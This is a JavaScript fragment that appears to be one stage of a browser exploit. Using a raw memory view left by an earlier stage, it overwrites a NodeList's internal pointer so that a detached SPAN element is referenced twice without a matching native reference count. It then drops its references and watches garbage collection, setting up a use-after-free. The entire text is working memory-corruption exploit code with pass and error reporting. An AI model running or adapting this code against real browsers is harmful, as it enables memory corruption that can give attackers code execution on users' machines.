// Duplicate a retained Element pointer without adding the matching native Ref.
var held = window.__fw14NodeState;
var result;
var phase = "preflight";
var changed = false;
var view, index, firstBytes;
try {
  if (!held || held.list.length !== 8191 ||
      held.list.item(0) !== held.firstNode)
    throw new Error("missing_valid_held_list");
  var list = held.list;
  var element = list.item(1);
  if (!element || element === held.firstNode ||
      element.nodeName !== "SPAN" || !element.parentNode)
    throw new Error("invalid_second_element");
  view = held.view;
  index = held.index;
  firstBytes = held.elementBytes;
  var secondBytes = [];
  for (var i = 0; i < 8; i++) {
    if (view[index + i] !== firstBytes[i]) throw new Error("stale_first_pointer");
    secondBytes.push(view[index + 8 + i]);
  }
  if (secondBytes.join(",") === firstBytes.join(","))
    throw new Error("same_element_pointer");
  var parent = element.parentNode;
  element.id = "fw14-element-probe";
  phase = "detach_element";
  parent.removeChild(element);
  var detached = element.parentNode === null &&
      element.id === "fw14-element-probe";
  if (!detached) throw new Error("element_not_detached");
  var nodeType = element.nodeType;
  var nodeId = element.id;
  var events = [];
  var registry = new FinalizationRegistry(function (label) { events.push(label); });
  var weak = new WeakRef(list);
  registry.register(list, "list");
  phase = "duplicate_list_pointer";
  if (api && typeof api.markSync === "function") api.markSync("element_before_write");
  changed = true;
  for (var w = 0; w < 8; w++) view[index + w] = secondBytes[w];
  var duplicated = list.item(0) === element && list.item(1) === element;
  if (!duplicated) throw new Error("element_duplicate_not_live");
  if (api && typeof api.markSync === "function") api.markSync("element_before_release");
  window.__fw14ElementState = {
    node: element, weak: weak, registry: registry,
    events: events, mode: "element-mutated", detached: detached,
    view: view, index: index, firstBytes: firstBytes
  };
  held.list = null;
  window.__fw14NodeState = null;
  list = null;
  held = null;
  result = { id: "element_release_mutated", status: "pass", details: {
    detached: detached, duplicated: duplicated, changed: changed,
    node_type: nodeType, node_id: nodeId
  } };
} catch (error) {
  if (changed && view && firstBytes)
    for (var x = 0; x < 8; x++) view[index + x] = firstBytes[x];
  result = { id: "element_release_mutated", status: "error", details: {
    phase: phase, changed: changed, error: String(error).slice(0, 200)
  } };
}
return [result];
